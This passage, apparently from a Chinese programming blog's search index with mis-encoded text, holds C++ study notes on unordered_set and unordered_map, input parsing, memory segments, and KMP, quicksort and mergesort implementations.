\u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;unordered_set\u0026gt; // å¼•å…¥unordered_set int main() { // 1. åˆ›å»ºä¸€ä¸ªç©ºçš„ unordered_setï¼Œå­˜å‚¨å­—ç¬¦ std::unordered_set\u0026lt;char\u0026gt; brokenSet; // 2. æ’å…¥å…ƒç´  (ç›¸å½“äºæ·»åŠ å­¦å·) brokenSet.insert(\u0026#39;a\u0026#39;); brokenSet.insert(\u0026#39;b\u0026#39;); brokenSet.insert(\u0026#39;c\u0026#39;); brokenSet.insert(\u0026#39;a\u0026#39;); // é‡å¤æ’å…¥ \u0026#39;a\u0026#39;ï¼Œä½† set åªä¼šä¿ç•™ä¸€ä¸ª \u0026#39;a\u0026#39; // 3. æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨ char letterToFind = \u0026#39;b\u0026#39;; if (brokenSet.count(letterToFind)) { // count() è¿”å› 1 å¦‚æœå­˜åœ¨, 0 å¦‚æœä¸å­˜åœ¨ std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; å­˜åœ¨äºé›†åˆä¸­ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; ä¸å­˜åœ¨äºé›†åˆä¸­ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } letterToFind = \u0026#39;d\u0026#39;; if (brokenSet.count(letterToFind)) { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; å­˜åœ¨äºé›†åˆä¸­ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; ä¸å­˜åœ¨äºé›†åˆä¸­ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } // 4. ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆå§‹åŒ– set std::string brokenLetters = \u0026#34;xyz\u0026#34;; std::unordered_set\u0026lt;char\u0026gt; brokenSetFromString(brokenLetters.begin(), brokenLetters.end()); if (brokenSetFromString.count(\u0026#39;y\u0026#39;)) { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;y\u0026#39; å­˜åœ¨äºä»å­—ç¬¦ä¸²åˆ›å»ºçš„é›†åˆä¸­ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } return 0; } std::unordered_map (é”®å€¼å¯¹æ˜ å°„) ç”¨äºæ ¹æ®ä¸€ä¸ªé”®å¿«é€ŸæŸ¥æ‰¾å¯¹åº”çš„å€¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;unordered_map\u0026gt; // å¼•å…¥unordered_map int main() { // 1. åˆ›å»ºä¸€ä¸ªç©ºçš„ unordered_mapï¼Œå­˜å‚¨ string åˆ° int çš„æ˜ å°„ std::unordered_map\u0026lt;std::string, int\u0026gt; studentScores; // 2. æ’å…¥é”®å€¼å¯¹ studentScores.insert({\u0026#34;Alice\u0026#34;, 95}); studentScores[\u0026#34;Bob\u0026#34;] = 88; // å¦ä¸€ç§æ’å…¥æ–¹å¼ studentScores[\u0026#34;Charlie\u0026#34;] = 92; // 3. é€šè¿‡é”®æŸ¥æ‰¾å€¼ std::string studentName = \u0026#34;Alice\u0026#34;; // ä½¿ç”¨ find() æŸ¥æ‰¾ï¼Œå®ƒè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ auto it = studentScores.find(studentName); if (it != studentScores.end()) { // å¦‚æœæ‰¾åˆ°äº† (è¿­ä»£å™¨ä¸æ˜¯æŒ‡å‘æœ«å°¾) std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; çš„åˆ†æ•°æ˜¯: \u0026#34; \u0026lt;\u0026lt; it-\u0026gt;second \u0026lt;\u0026lt; std::endl; // it-\u0026gt;second æ˜¯å€¼ } else { std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; ä¸å­˜åœ¨ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } studentName = \u0026#34;David\u0026#34;; if (studentScores.find(studentName) != studentScores.end()) { std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; çš„åˆ†æ•°æ˜¯: \u0026#34; \u0026lt;\u0026lt; studentScores[studentName] \u0026lt;\u0026lt; std::endl; // studentName.score ä¹Ÿå¯ä»¥ç›´æ¥è®¿é—® } else { std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; ä¸å­˜åœ¨ã€‚\u0026#34; \u0026lt;\u0026lt; std::endl; } // 4. å°è¯•è®¿é—®ä¸å­˜åœ¨çš„é”®ï¼ˆå¦‚æœç”¨ [] è®¿é—®ï¼‰ // æ³¨æ„ï¼šå¦‚æœé”®ä¸å­˜åœ¨ï¼Œ[] ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªé”®å€¼å¯¹ï¼Œå€¼æ˜¯é»˜è®¤åˆå§‹åŒ–çš„ï¼ˆintæ˜¯0ï¼‰ // std::cout \u0026lt;\u0026lt; \u0026#34;David çš„åˆ†æ•° (åˆ›å»ºå): \u0026#34; \u0026lt;\u0026lt; studentScores[\u0026#34;David\u0026#34;] \u0026lt;\u0026lt; std::endl; // è¿™è¡Œä¼šä½¿ David å‡ºç°ï¼Œåˆ†æ•°ä¸º 0 return 0; } ä¸€äº›å°tips å®åœ¨æ²¡æ‹›äº†ï¼Œä¸è®°è¦å¿˜ã€‚ã€‚ã€‚\nè¯»å–è¾“å…¥ ä¸€èˆ¬æ¥è¯´è¯»å–å­—ç¬¦ä¸²ç”¨ getline() å°±è¡Œï¼Œå¦‚æœæƒ³è¦è¯»åˆ°ä¸€ä¸ªæ•´å‹æ•°ç»„ï¼Œè¿˜éœ€è¦è¿›è¡Œè¾“å…¥æµå¤„ç†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;iostream\u0026gt; #include \u0026lt;sstream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { string line; getline(cin, line); // è¯»å–ä¸€æ•´è¡Œï¼Œä¾‹å¦‚ï¼š2 3 1 4 5 6 istringstream iss(line); // æŠŠå­—ç¬¦ä¸²å½“ä½œè¾“å…¥æµæ¥å¤„ç† vector\u0026lt;int\u0026gt; nums; int x; while (iss \u0026gt;\u0026gt; x) { // è·³è¿‡ç©ºæ ¼ç­‰åˆ†éš”ç¬¦å–æ•´æ•°ï¼Œç›´åˆ°å–å®Œ nums.push_back(x); } // æµ‹è¯•è¾“å‡º cout \u0026lt;\u0026lt; \u0026#34;è¾“å…¥çš„æ•°ç»„: \u0026#34;; for (int n : nums) cout \u0026lt;\u0026lt; n \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; endl; return 0; } å†…å­˜åˆ†åŒº åœ¨ C++ ä¸­ï¼Œå†…å­˜åˆ†åŒºæ˜¯ç»•ä¸å¼€çš„æ ¸å¿ƒæ¦‚å¿µä¹‹ä¸€ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç¨‹åºçš„å†…å­˜ç©ºé—´ä¼šè¢«åˆ’åˆ†ä¸ºå››ä¸ªä¸»è¦åŒºåŸŸï¼ˆç”±ä½åœ°å€åˆ°é«˜åœ°å€ï¼‰ï¼š\nä»£ç åŒº æ•°æ®åŒº å †åŒº æ ˆåŒº æ ˆåŒºï¼ˆStackï¼‰ åˆ†é…æ–¹å¼ï¼šç”±ç¨‹åºè‡ªåŠ¨å‘æ“ä½œç³»ç»Ÿç”³è¯·å’Œå›æ”¶ï¼Œé€Ÿåº¦å¿«ã€ä½¿ç”¨æ–¹ä¾¿ï¼Œä½†ç¨‹åºå‘˜æ— æ³•ç›´æ¥æ§åˆ¶ã€‚ ç©ºé—´å¤§å°ï¼šä¸€èˆ¬åœ¨å‡  MB ~ å‡ å MBã€‚è‹¥é€’å½’è¿‡æ·±æˆ–æ•°ç»„è¿‡å¤§ï¼Œå¯èƒ½è§¦å‘ æ ˆæº¢å‡ºï¼ˆstack overflowï¼‰ã€‚ éµå¾ªåŸåˆ™ï¼šåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰ã€‚ å­˜å‚¨å†…å®¹åŒ…æ‹¬ï¼š\nconst å±€éƒ¨å˜é‡ å‡½æ•°å‚æ•° å‡½æ•°è¿”å›åœ°å€ ä¿å­˜çš„å¯„å­˜å™¨ï¼ˆå¦‚è¿”å›åœ°å€ã€å¸§æŒ‡é’ˆç­‰ï¼‰ ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼š å½“å˜é‡è¿›å…¥ä½œç”¨åŸŸæ—¶ï¼Œç³»ç»Ÿä¼šåœ¨æ ˆä¸Šä¸ºå…¶ç”³è¯·ç©ºé—´ï¼›å½“å˜é‡ç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨é‡Šæ”¾è¿™éƒ¨åˆ†å†…å­˜ã€‚\nå †åŒºï¼ˆHeapï¼‰ åˆ†é…æ–¹å¼ï¼šç”±ç¨‹åºå‘˜æ‰‹åŠ¨ç”³è¯·ï¼ˆå¦‚ newã€mallocï¼‰ï¼Œå¹¶ä¸”éœ€è¦æ‰‹åŠ¨é‡Šæ”¾ï¼ˆdeleteã€freeï¼‰ã€‚ ç©ºé—´å¤§å°ï¼šé€šå¸¸è¿œå¤§äºæ ˆï¼Œå¯è¾¾ MB ~ GB çº§ï¼Œä¸€èˆ¬æ˜¯èƒ½ç”³è¯·å¤šå°‘å°±æœ‰å¤šå°‘ï¼Œå®é™…å¯ç”¨å¤§å°å–å†³äºæ“ä½œç³»ç»Ÿå’Œç‰©ç†å†…å­˜ã€‚ å­˜å‚¨ç»“æ„ï¼šä¸åƒæ ˆæ˜¯è¿ç»­ç©ºé—´ï¼Œå †çš„åˆ†é…é€šè¿‡ é“¾è¡¨/ç©ºé—²å—è¡¨ ç®¡ç†ï¼Œå› æ­¤å¯èƒ½äº§ç”Ÿ å†…å­˜ç¢ç‰‡ã€‚ å¦‚æœå¿˜è®°é‡Šæ”¾ï¼Œå®¹æ˜“å¯¼è‡´ å†…å­˜æ³„æ¼ã€‚\næ•°æ®åŒºï¼ˆData Segmentï¼‰ åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š\nå·²åˆå§‹åŒ–æ•°æ®åŒº å­˜æ”¾ å·²æ˜¾å¼åˆå§‹åŒ– çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚\n1 2 int g1 = 10; // å·²åˆå§‹åŒ–å…¨å±€å˜é‡ static int s1 = 20; // å·²åˆå§‹åŒ–é™æ€å˜é‡ æœªåˆå§‹åŒ–æ•°æ®åŒºï¼ˆBSS æ®µï¼‰ å­˜æ”¾ æœªåˆå§‹åŒ– çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸º 0ã€‚\n1 2 int g2; // æœªåˆå§‹åŒ–å…¨å±€å˜é‡ static int s2; // æœªåˆå§‹åŒ–é™æ€å˜é‡ ä»£ç åŒºï¼ˆCode/Text Segmentï¼‰ å­˜æ”¾å†…å®¹ï¼šç¨‹åºçš„å¯æ‰§è¡Œä»£ç ï¼ˆæœºå™¨æŒ‡ä»¤ï¼‰ã€‚ åªè¯»å±æ€§ï¼šå¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œä»£ç åŒºæ˜¯åªè¯»çš„ï¼Œé˜²æ­¢ç¨‹åºæ„å¤–ä¿®æ”¹è‡ªèº«æŒ‡ä»¤ã€‚ å…±äº«æœºåˆ¶ï¼šç›¸åŒç¨‹åºçš„å¤šä¸ªè¿›ç¨‹å¯ä»¥å…±äº«ä»£ç åŒºï¼Œæé«˜æ•ˆç‡ã€‚ ğŸ’¡ å…³äº å¸¸é‡ï¼š æœ‰äº›å®ç°ä¼šå°†åªè¯»å¸¸é‡æ”¾åœ¨å•ç‹¬çš„å¸¸é‡åŒºï¼ˆä½äºä»£ç åŒºå’Œæ•°æ®åŒºä¹‹é—´ï¼‰ï¼›ä¹Ÿæœ‰å®ç°ç›´æ¥æŠŠå¸¸é‡åˆ’å½’åˆ°ä»£ç åŒºã€‚æ— è®ºå“ªç§æ–¹å¼ï¼Œå¸¸é‡åŒºéƒ½æ˜¯åªè¯»çš„ã€‚\nç¤ºä¾‹å›¾ï¼š\nå†…å­˜å‚è€ƒé“¾æ¥\nç®—æ³• æœ¬äººå®åœ¨æ‡’å¾—å¼€æ–°è´´äº†ï¼Œè¿˜æ˜¯åœ¨è¿™é‡Œå†™å§ã€‚\nKMP ä¸€ä¸ªäººèƒ½èƒ½èµ°çš„å¤šè¿œä¸åœ¨äºä»–åœ¨é¡ºå¢ƒæ—¶èƒ½èµ°çš„å¤šå¿«ï¼Œè€Œåœ¨äºä»–åœ¨é€†å¢ƒæ—¶å¤šä¹…èƒ½æ‰¾åˆ°æ›¾ç»çš„è‡ªå·±ã€‚ â€”â€”KMP (from é«˜èµå›ç­”)\nKMPç®—æ³•æ˜¯ä¸€ç§ç”¨äºå­—ç¬¦ä¸²åŒ¹é…çš„é«˜æ•ˆç®—æ³•ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯åˆ©ç”¨å·²ç»åŒ¹é…çš„éƒ¨åˆ†ä¿¡æ¯æ¥é¿å…ä¸å¿…è¦çš„å›é€€ã€‚\nå…ˆç»™å‡ºä»£ç å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 std::vector\u0026lt;int\u0026gt; build_next(const std::string\u0026amp; patt) { // åŠŸèƒ½ï¼šè®¡ç®— KMP ç®—æ³•æ‰€éœ€çš„ next æ•°ç»„ï¼ˆéƒ¨åˆ†åŒ¹é…è¡¨ï¼‰ std::vector\u0026lt;int\u0026gt; next; next.push_back(0); // next æ•°ç»„ (åˆå€¼å…ƒç´ ä¸€ä¸ª 0) int prefix_len = 0; // å½“å‰å…±åŒå‰åç¼€çš„é•¿åº¦ int i = 1; while (i \u0026lt; patt.length()) { if (patt[prefix_len] == patt[i]) { prefix_len += 1; next.push_back(prefix_len); i += 1; } else { if (prefix_len == 0) { next.push_back(0); i += 1; } else { // å…³é”®ï¼šå›æº¯ï¼Œå¯»æ‰¾æ›´çŸ­çš„å…±åŒå‰åç¼€ prefix_len = next[prefix_len - 1]; } } } return next; } int kmp_search(const std::string\u0026amp; text, const std::string\u0026amp; patt) { // åŠŸèƒ½ï¼šåœ¨ä¸»ä¸²(text)ä¸­æŸ¥æ‰¾å­ä¸²(patt)çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® if (patt.empty()) { return 0; } if (text.length() \u0026lt; patt.length()) { return -1; } std::vector\u0026lt;int\u0026gt; next = build_next(patt); int i = 0; // ä¸»ä¸²ä¸­çš„æŒ‡é’ˆ int j = 0; // å­ä¸²ä¸­çš„æŒ‡é’ˆ while (i \u0026lt; text.length()) { if (text[i] == patt[j]) { // å­—ç¬¦åŒ¹é…ï¼ŒæŒ‡é’ˆåç§» i += 1; j += 1; } else if (j \u0026gt; 0) { // å­—ç¬¦å¤±é…ï¼Œæ ¹æ® next è·³è¿‡å­ä¸²å‰é¢çš„ä¸€äº›å­—ç¬¦ j = next[j - 1]; } else { // å­ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦å°±å¤±é… i += 1; } if (j == patt.length()) { // åŒ¹é…æˆåŠŸ return i - j; } } return -1; // éå†å®Œä¸»ä¸²åä»æœªæ‰¾åˆ°ï¼Œè¿”å› -1 } ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ä¸åŒçš„èµ„æ–™å¯¹nextçš„å®šä¹‰å¯èƒ½ç•¥æœ‰ä¸åŒï¼Œæˆ‘ä¸Šé¢å†™çš„æ˜¯æˆ‘è‡ªå·±è§‰å¾—å¥½ç†è§£çš„ç®—æ³•ï¼Œä»…ä¾›å‚è€ƒã€‚\næœ¬äººçš„æ‹™è§ï¼šé¦–å…ˆnextå­˜å‚¨çš„æ˜¯å­ä¸²æ¯ä¸ªä¸‹æ ‡æˆªæ­¢çš„æœ€é•¿ç›¸åŒå‰åç¼€ï¼Œæ¯”å¦‚ABAï¼Œnext[2]ä¸º1ï¼ŒåŒæ—¶nextå­˜å‚¨çš„ä¹Ÿæ˜¯ä¸»å‡½æ•°ä¸­èƒ½è·³è¿‡å­—ç¬¦çš„ä¸ªæ•°ï¼Œèƒ½è·³è¿‡çš„åŸå› ä¹Ÿæ˜¯å› ä¸ºç›¸åŒå‰åç¼€ï¼Œæ¯”å¦‚åœ¨ABABABCAAä¸­å¯»æ‰¾ABABCï¼Œå¯¹åº”çš„nextæ•°ç»„ä¸º[0,0,1,2,0],ç¬¬ä¸€æ¬¡å›æº¯æ—¶ï¼Œjä»4å˜ä¸º2ï¼Œè¿™æ˜¯å› ä¸ºä¸»ä¸²å’Œå­—ä¸²ä¸­åŒæœ‰ABABçš„å½¢å¼ï¼Œå› æ­¤å¯ä»¥è·³è¿‡ä¸¤ä¸ªå­—ç¬¦ä¸²\nå¿«é€Ÿæ’åºå’Œå½’å¹¶æ’åº å‰è€…å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(Nlog N) ï¼Œæœ€å O(N^2)ï¼›åè€…ç¨³å®š O(Nlog N)ã€‚\nå¿«é€Ÿæ’åº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;algorithm\u0026gt; // åŒ…å« std::swap /** * åˆ†åŒºå‡½æ•°ï¼šé€‰æ‹©ä¸€ä¸ªåŸºå‡†å€¼ï¼ˆè¿™é‡Œé€‰æ‹©æœ€å³è¾¹çš„å…ƒç´ ,å®é™…åº”ç”¨åº”è¯¥æ˜¯éšæœºé€‰æ‹©æ•°ç»„å†…çš„æ•°ï¼‰ï¼Œ * å¹¶å°†æ‰€æœ‰å°äºç­‰äºå®ƒçš„å…ƒç´ ç§»åˆ°å·¦è¾¹ï¼Œå¤§äºå®ƒçš„å…ƒç´ ç§»åˆ°å³è¾¹ã€‚ * æœ€åå°†åŸºå‡†å€¼æ”¾åœ¨æ­£ç¡®çš„ä½ç½®ï¼Œå¹¶è¿”å›å…¶ç´¢å¼•ã€‚ * * @param arr å¾…æ’åºæ•°ç»„ * @param low åˆ†åŒºèŒƒå›´çš„èµ·å§‹ç´¢å¼• * @param high åˆ†åŒºèŒƒå›´çš„ç»“æŸç´¢å¼• * @return åŸºå‡†å€¼æœ€ç»ˆçš„ç´¢å¼• */ int partition(std::vector\u0026lt;int\u0026gt;\u0026amp; arr, int low, int high) { // 1. é€‰æ‹©æœ€å³è¾¹çš„å…ƒç´ ä½œä¸ºåŸºå‡†å€¼ (Pivot) int pivot = arr[high]; // i æ˜¯è¾ƒå°å…ƒç´ çš„ç´¢å¼•ï¼Œç”¨äºæŒ‡ç¤ºå°äºæˆ–ç­‰äºåŸºå‡†å€¼çš„å…ƒç´ çš„â€œå°¾éƒ¨â€ int i = (low - 1); // 2. éå†å½“å‰èŒƒå›´å†…çš„å…ƒç´  for (int j = low; j \u0026lt;= high - 1; j++) { // å¦‚æœå½“å‰å…ƒç´ å°äºæˆ–ç­‰äºåŸºå‡†å€¼ if (arr[j] \u0026lt;= pivot) { i++; // å¢åŠ è¾ƒå°å…ƒç´ çš„ç´¢å¼• std::swap(arr[i], arr[j]); } } // 3. å°†åŸºå‡†å€¼ï¼ˆarr[high]ï¼‰æ”¾åˆ°æ­£ç¡®çš„ä½ç½® (i+1) std::swap(arr[i + 1], arr[high]); return (i + 1); } /** * å¿«é€Ÿæ’åºä¸»å‡½æ•° * * @param arr å¾…æ’åºæ•°ç»„ * @param low æ’åºèŒƒå›´çš„èµ·å§‹ç´¢å¼• * @param high æ’åºèŒƒå›´çš„ç»“æŸç´¢å¼• */ void quickSort(std::vector\u0026lt;int\u0026gt;\u0026amp; arr, int low, int high) { if (low \u0026lt; high) { // 1. åˆ†åŒºï¼šè·å–åŸºå‡†å€¼çš„æœ€ç»ˆä½ç½® int pi = partition(arr, low, high); // 2. é€’å½’ï¼šå¯¹å·¦å­åºåˆ—è¿›è¡Œå¿«é€Ÿæ’åº quickSort(arr, low, pi - 1); // 3. é€’å½’ï¼šå¯¹å³å­åºåˆ—è¿›è¡Œå¿«é€Ÿæ’åº quickSort(arr, pi + 1, high); } } å½’å¹¶æ’åº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;algorithm\u0026gt; // åŒ…å« std::copy /** * å½’å¹¶å‡½æ•°ï¼šå°†ä¸¤ä¸ªæœ‰åºå­æ•°ç»„ arr[l..m] å’Œ arr[m+1..r] åˆå¹¶æˆä¸€ä¸ªæœ‰åºæ•°ç»„ã€‚ * * @param arr å¾…æ’åºæ•°ç»„ * @param l å·¦å­æ•°ç»„çš„èµ·å§‹ç´¢å¼• * @param m ä¸­ç‚¹ç´¢å¼•ï¼ˆå·¦å­æ•°ç»„çš„ç»“æŸç´¢å¼•ï¼‰ * @param r å³å­æ•°ç»„çš„ç»“æŸç´¢å¼• */ void merge(std::vector\u0026lt;int\u0026gt;\u0026amp; arr, int l, int m, int r) { int n1 = m - l + 1; // å·¦å­æ•°ç»„çš„å¤§å° int n2 = r - m; // å³å­æ•°ç»„çš„å¤§å° // 1. åˆ›å»ºä¸´æ—¶å­æ•°ç»„ L å’Œ R std::vector\u0026lt;int\u0026gt; L(n1); std::vector\u0026lt;int\u0026gt; R(n2); // æ‹·è´æ•°æ®åˆ°ä¸´æ—¶æ•°ç»„ L å’Œ R for (int i = 0; i \u0026lt; n1; i++) { L[i] = arr[l + i]; } for (int j = 0; j \u0026lt; n2; j++) { R[j] = arr[m + 1 + j]; } // 2. åˆå¹¶ä¸´æ—¶æ•°ç»„å›åˆ° arr[l..r],å¹¶ä¸”æ’åº int i = 0; // L çš„åˆå§‹ç´¢å¼• int j = 0; // R çš„åˆå§‹ç´¢å¼• int k = l; // åˆå¹¶åæ•°ç»„çš„åˆå§‹ç´¢å¼• while (i \u0026lt; n1 \u0026amp;\u0026amp; j \u0026lt; n2) { if (L[i] \u0026lt;= R[j]) { arr[k] = L[i]; i++; } else { arr[k] = R[j]; j++; } k++; } // 3. æ‹·è´ L æ•°ç»„ä¸­å‰©ä½™çš„å…ƒç´ ï¼ˆå¦‚æœæœ‰ï¼‰ while (i \u0026lt; n1) { arr[k] = L[i]; i++; k++; } // 4. æ‹·è´ R æ•°ç»„ä¸­å‰©ä½™çš„å…ƒç´ ï¼ˆå¦‚æœæœ‰ï¼‰ while (j \u0026lt; n2) { arr[k] = R[j]; j++; k++; } } /** * å½’å¹¶æ’åºä¸»å‡½æ•°ï¼ˆé‡‡ç”¨åˆ†æ²»æ³•ï¼‰ * * @param arr å¾…æ’åºæ•°ç»„ * @param l æ’åºèŒƒå›´çš„èµ·å§‹ç´¢å¼• * @param r æ’åºèŒƒå›´çš„ç»“æŸç´¢å¼• */ void mergeSort(std::vector\u0026lt;int\u0026gt;\u0026amp; arr, int l, int r) { if (l \u0026lt; r) { // 1. åˆ†å‰²ï¼šæ‰¾åˆ°ä¸­ç‚¹ int m = l + (r - l) / 2; // 2. é€’å½’ï¼šå¯¹å·¦åŠéƒ¨åˆ†è¿›è¡Œæ’åº mergeSort(arr, l, m); // 3. é€’å½’ï¼šå¯¹å³åŠéƒ¨åˆ†è¿›è¡Œæ’åº mergeSort(arr, m + 1, r); // 4. å½’å¹¶ï¼šåˆå¹¶ä¸¤ä¸ªå·²æ’åºçš„å­æ•°ç»„ merge(arr, l, m, r); } } å¯ä»¥çœ‹å‡ºä¸¤ä¸ªæ’åºæ ¸å¿ƒéƒ½ç¦»ä¸å¼€é€’å½’ï¼Œä¸è¿‡å‰è€…æ˜¯å…ˆæ’åºå†é€’å½’ï¼Œåè€…æ˜¯å…ˆé€’å½’åˆ°åº•å†æ’åºã€‚\n","date":"2025-05-06T00:00:00Z","image":"https://example.com/p/c-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/preview_hu_99a263efe87b5c20.gif","permalink":"https://example.com/p/c-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","title":"C++é¢å‘å¯¹è±¡"},{"content":"","date":"2025-05-06T00:00:00Z","permalink":"https://example.com/p/%E4%BB%8A%E5%A4%A9%E6%88%91%E7%9A%84blog%E8%AF%9E%E7%94%9F%E4%BA%86/","title":"ä»Šå¤©ï¼Œæˆ‘çš„blogè¯ç”Ÿäº†"}]